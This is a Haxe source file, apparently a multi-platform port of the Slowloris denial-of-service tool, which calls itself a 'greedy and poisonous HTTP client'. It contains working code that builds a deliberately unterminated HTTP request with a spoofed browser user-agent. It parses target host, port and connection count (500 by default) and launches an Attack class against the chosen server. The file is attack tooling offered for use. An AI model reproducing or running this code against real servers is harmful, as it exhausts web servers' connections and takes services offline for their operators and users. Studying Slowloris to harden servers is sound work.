
#if neko
import neko.Lib;
import neko.Sys;
#elseif cpp
import cpp.Lib;
import cpp.Sys;
#elseif nodejs
import js.Node;
import js.Lib;
import js.Sys;
#elseif php
import php.Lib;
import php.Sys;
#end

#if flash
class Socket extends flash.net.Socket {
	public var id(default,null) : Int;
	public function new( id : Int = -1 ) {
		super();
		this.id = id;
	}
	public inline function write( t : String ) {
		writeUTFBytes( t ); 
		flush();
	}
}
#end

/**
*/
class Slowloris {
	
	public static var DESCRIPTION = 'Slowloris - The low bandwidth, yet greedy and poisonous HTTP client';
	public static var INTRO ="CCCCCCCCCCOOCCOOOOO888@8@8888OOOOCCOOO888888888@@@@@@@@@8@8@@@@888OOCooocccc::::
CCCCCCCCCCCCCCCOO888@888888OOOCCCOOOO888888888888@88888@@@@@@@888@8OOCCoococc:::
CCCCCCCCCCCCCCOO88@@888888OOOOOOOOOO8888888O88888888O8O8OOO8888@88@@8OOCOOOCoc::
CCCCooooooCCCO88@@8@88@888OOOOOOO88888888888OOOOOOOOOOCCCCCOOOO888@8888OOOCc::::
CooCoCoooCCCO8@88@8888888OOO888888888888888888OOOOCCCooooooooCCOOO8888888Cocooc:
ooooooCoCCC88@88888@888OO8888888888888888O8O8888OOCCCooooccccccCOOOO88@888OCoccc
ooooCCOO8O888888888@88O8OO88888OO888O8888OOOO88888OCocoococ::ccooCOO8O888888Cooo
oCCCCCCO8OOOCCCOO88@88OOOOOO8888O888OOOOOCOO88888O8OOOCooCocc:::coCOOO888888OOCC
oCCCCCOOO88OCooCO88@8OOOOOO88O888888OOCCCCoCOOO8888OOOOOOOCoc::::coCOOOO888O88OC
oCCCCOO88OOCCCCOO8@@8OOCOOOOO8888888OoocccccoCO8O8OO88OOOOOCc.:ccooCCOOOO88888OO
CCCOOOO88OOCCOOO8@888OOCCoooCOO8888Ooc::...::coOO88888O888OOo:cocooCCCCOOOOOO88O
CCCOO88888OOCOO8@@888OCcc:::cCOO888Oc..... ....cCOOOOOOOOOOOc.:cooooCCCOOOOOOOOO
OOOOOO88888OOOO8@8@8Ooc:.:...cOO8O88c.      .  .coOOO888OOOOCoooooccoCOOOOOCOOOO
OOOOO888@8@88888888Oo:. .  ...cO888Oc..          :oOOOOOOOOOCCoocooCoCoCOOOOOOOO
COOO888@88888888888Oo:.       .O8888C:  .oCOo.  ...cCCCOOOoooooocccooooooooCCCOO
CCCCOO888888O888888Oo. .o8Oo. .cO88Oo:       :. .:..ccoCCCooCooccooccccoooooCCCC
coooCCO8@88OO8O888Oo:::... ..  :cO8Oc. . .....  :.  .:ccCoooooccoooocccccooooCCC
:ccooooCO888OOOO8OOc..:...::. .co8@8Coc::..  ....  ..:cooCooooccccc::::ccooCCooC
.:::coocccoO8OOOOOOC:..::....coCO8@8OOCCOc:...  ....:ccoooocccc:::::::::cooooooC
....::::ccccoCCOOOOOCc......:oCO8@8@88OCCCoccccc::c::.:oCcc:::cccc:..::::coooooo
.......::::::::cCCCCCCoocc:cO888@8888OOOOCOOOCoocc::.:cocc::cc:::...:::coocccccc
...........:::..:coCCCCCCCO88OOOO8OOOCCooCCCooccc::::ccc::::::.......:ccocccc:co
.............::....:oCCoooooCOOCCOCCCoccococc:::::coc::::....... ...:::cccc:cooo
 ..... ............. .coocoooCCoco:::ccccccc:::ccc::..........  ....:::cc::::coC
   .  . ...    .... ..  .:cccoCooc:..  ::cccc:::c:.. ......... ......::::c:cccco
  .  .. ... ..    .. ..   ..:...:cooc::cccccc:.....  .........  .....:::::ccoocc
       .   .         .. ..::cccc:.::ccoocc:. ........... ..  . ..:::.:::::::ccco    
";
	
	static function getUserAgent() : String {
		return "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)";
	}
	
	public static function createPayload( host : String, random : Bool = false, method : String = "GET" ) : String {
		var ran = if( random ) "?"+Math.random()*9999999.0 else ""; // TODO
		var t = new StringBuf();
		t.add( method );
		t.add( " /" );
		t.add( ran );
		t.add( " HTTP/1.1\r\n" );
		t.add( "Host: " );
		t.add( host );
		t.add( "\r\n" );
		t.add( "User-Agent: " );
		t.add( getUserAgent() );
		t.add( "\r\n" );
		t.add( "Content-Length: 42\r\n" );
		return t.toString();
	}

	public static function warn( t : String ) {
		#if flash
		trace( t, "warn" );
		#else
		trace( '\033[31m'+t+'\033[m' );
		#end
	}
	
	#if !flash
	static inline function trace( t : Dynamic, ?inf : haxe.PosInfos ) {
		Lib.println( t );
	}
	#end
	
	static function main() {
		
		#if !flash
		haxe.Log.trace = Slowloris.trace;
		#end
		
		var help = false;
		var test = false;
		
		var host = "localhost";
		var port = 80;
		var numConnections = 500;
		var sendhost = host;
		var tcpto = 5;
		var timeout = 500;
		var cache = true;
		var flashcheck = false;
		
		#if flash
		//flash.Lib.current.stage.scaleMode = flash.display.StageScaleMode.NO_SCALE;
		//flash.Lib.current.stage.align = flash.display.StageAlign.TOP_LEFT;
		////var params = flash.Lib.current.root.loaderInfo.parameters;
		#end
		
		#if (neko||cpp||php||nodejs)
		var args = Sys.args();
		//#if nodejs args = args.splice(2,args.length-2); //HACK #end
		var i = 0;
		while( i < args.length ) {
			var id = args[i];
			var v = args[i+1];
			switch(id) {
			//case "-usage" :
			case "-intro" :
				trace( INTRO );
				warn( DESCRIPTION+'\n' );
				return;
			case "-help" : help = true; break;
			case "-host" : host = v;
			case "-test" : test = true; i--;
			case "-port" : port = Std.parseInt( v );
			case "-timeout" : timeout = Std.parseInt( v );
			case "-num" : numConnections = Std.parseInt( v );
			case "-tcpto" : tcpto = Std.parseInt( v );
			case "-shost" : sendhost = v;
			case "-cache" : cache = ( v == "true" );
		//case "-flashcheck" : flashcheck = true; i--;
			default :
				trace( "Unknown option ("+id+")." );
				return;
			}
			i += 2;
		}
		#end
		if( help ) {
			trace( haxe.Resource.getString( "help" ) );
			return;
		}
		if( test ) {
			var sl = new slowloris.Test( host, port, sendhost, tcpto, cache );
			sl.start();
		/*
		} else if( flashcheck ) {
			var sl = new slowloris.FlashPolicyCheck( host, port );
			sl.start();
		*/
		} else {
			var sl = new slowloris.Attack( host, port, numConnections, tcpto, timeout, sendhost, cache );
			sl.start();
		}
	}
	
}
